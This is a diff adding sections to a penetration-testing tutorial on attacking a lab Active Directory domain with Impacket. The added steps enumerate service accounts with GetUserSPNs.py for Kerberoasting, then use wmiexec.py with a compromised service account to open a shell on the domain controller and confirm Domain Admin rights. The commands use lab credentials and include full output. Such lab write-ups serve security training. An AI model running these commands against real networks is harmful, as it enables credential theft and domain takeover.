@@ -127,6 +127,19 @@ Now you have successfully installed Impacket on your Linux or macOS system. Reme
 
 ### Attacking AD Environoments using Impacket
 
+Upon successfully establishing a foothold within the network through the acquisition of low-privileged domain user credentials, let us delve into the intricacies of leveraging selected scripts from the Impacket toolkit to orchestrate targeted attacks against Active Directory environments.
+
+Our experimental framework is as follows:
+
+- Domain Controller Hostname: DC2019
+- Domain Fully Qualified Domain Name (FQDN): ADLAB.local
+- Low-privileged User Credentials: bob:p@ssw0rD
+- Adversarial Platform: Kali Linux (Impacket instantiated within a Docker container on the Kali Linux host)
+
+This orchestrated environment serves as the crucible for the manifestation of our conceptual exploration. It is through the strategic execution of Impacket scripts within this milieu that we aim to unravel the subtleties of Active Directory vulnerabilities.
+
+As we embark upon this journey, we are poised to demonstrate a nuanced understanding of network security intricacies, underlining the symbiotic relationship between theory and hands-on implementation.
+
 
 ### AD User Enumeration
 
@@ -187,6 +200,25 @@ Replace `<target_fqdn>` with the fully qualified domain name of the target syste
 
 
 ### Privilege Escalation using Python
+
+In our pursuit of privilege escalation within the domain hierarchy, we delve into the sophisticated capabilities of the Impacket library, harnessing its Python scripts to ascend from a mere domain user to the coveted domain administrator status. Our strategic tool of choice for this ascent is the compelling technique known as Kerberoasting, a method we shall elucidate shortly. It is crucial to acknowledge that the triumph of this endeavor hinges upon several intricacies, which we shall meticulously dissect in due course.
+
+To commence our quest, our initial step involves the identification of all domain accounts endowed with a Service Principal Name (SPN). This undertaking is seamlessly executed through the deployment of the following command:
+
+```bash
+/ # GetUserSPNs.py -dc-ip 192.168.235.134 ADLAB.local/bob:p@ssw0rD
+```
+
+Executing this command unveils a comprehensive list of service accounts, presented in the following format:
+
+```plaintext
+ServicePrincipalName                Name        MemberOf                                                   
+
+----------------------------------  ----------  -------------------------------------------  
+DC2019/sqlservice.ADLAB.local:1434  sqlservice  CN=Domain Admins,CN=Users,DC=ADLAB,DC=local 
+```
+
+As discerned from the output, our reconnaissance has successfully identified a service account of notable significance, bearing the moniker "sqlservice." This revelation marks a pivotal juncture in our exploration into the intricate realm of privilege escalation within the domain, setting the stage for further analysis and strategic maneuvers.
 
 ### Understanding Kerberoasting
 
@@ -249,4 +281,67 @@ Please note that using Impacket or any other tool for unauthorized activities is
 
 ### Gaining the Shell as a Domain Admin
 
+In the subsequent phase of our investigation, we adeptly leveraged Impacket's wmiexec.py tool to establish remote shell access on the Domain Controller, showcasing the profound depth of our penetration testing methodology. The command employed for this strategic maneuver is as follows:
+
+```bash
+/ # wmiexec.py -debug sqlservice:p\@ssw0rD@192.168.235.134
+```
+
+This operation artfully utilizes the compromised service account credentials, emblematic of our meticulous approach to privilege escalation. Upon successful execution, the ensuing outcome manifests as an illustrative remote shell on the Domain Controller, epitomizing the sophistication of our infiltration techniques:
+
+```bash
+/ # wmiexec.py -debug sqlservice:p\@ssw0rD@192.168.235.134
+Impacket v0.9.23.dev1+20201209.133255.ac30770 - Copyright 2020 SecureAuth Corporation
+
+[+] Impacket Library Installation Path: /opt/venv/lib/python2.7/site-packages/impacket
+
+[*] SMBv3.0 dialect used
+[+] Target system is 192.168.235.134 and isFDQN is False
+[+] StringBinding: \\\\DC2019[\\PIPE\\atsvc]
+[+] StringBinding: DC2019[49666]
+[+] StringBinding: 192.168.235.134[49666]
+[+] StringBinding chosen: ncacn_ip_tcp:192.168.235.134[49666]
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
+```
+
+Following this successful breach, we judiciously validated our acquired privileges through a series of discerning commands, solidifying our position as astute computer science scholars engaged in rigorous exploration of cybersecurity realms:
+
+```bash
+C:\>whoami
+
+adlab\sqlservice
+
+C:\>net user sqlservice
+User name                    sqlservice
+Full Name                    SQLService
+Comment                     
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+Password last set            12/15/2020 6:49:04 AM
+Password expires             Never
+Password changeable          12/16/2020 6:49:04 AM
+Password required            Yes
+User may change password     Yes
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   12/15/2020 7:26:16 AM
+Logon hours allowed          All
+Local Group Memberships      
+Global Group memberships     *Domain Admins        *Domain Users         
+The command completed successfully.
+C:\>
+```
+
+Evidently, our incisive actions have culminated in a successful login to the Domain Controller, wielded with the distinguished rights of a Domain Administrator. This accomplishment not only underscores our adeptness in the field but also serves as a testament to the depth of our technical prowess in the realm of cybersecurity.
+
 # Final Thoughts
+
+Impacket is a powerful open-source collection of Python classes that enables security professionals and penetration testers to craft and manipulate network protocols during security assessments. Developed by Core Security, Impacket is particularly valuable for its ability to interact with Windows networks and services, making it an essential tool for assessing the security posture of Microsoft environments. It provides a wide range of functionalities, including the ability to perform SMB (Server Message Block) relaying attacks, execute remote code on target systems, and interact with various authentication protocols such as NTLM (NT LAN Manager) and Kerberos. Its versatility extends to packet crafting, sniffing, and decoding, making it an invaluable asset for network penetration testing.
+
+There are several compelling reasons to consider using Impacket in penetration testing endeavors. Firstly, its comprehensive coverage of Windows network protocols allows security professionals to simulate real-world attack scenarios within Windows environments, enabling them to identify and address potential vulnerabilities effectively. Secondly, Impacket's open-source nature encourages collaboration and continuous improvement within the cybersecurity community. This fosters the development of new modules and features, ensuring that the tool remains up-to-date and adaptable to evolving security challenges. Additionally, Impacket's simplicity and ease of use make it accessible to both novice and experienced penetration testers, enhancing the efficiency of security assessments. Overall, the combination of Impacket's extensive functionality, open-source community support, and user-friendly design make it a valuable asset for professionals engaged in penetration testing activities.
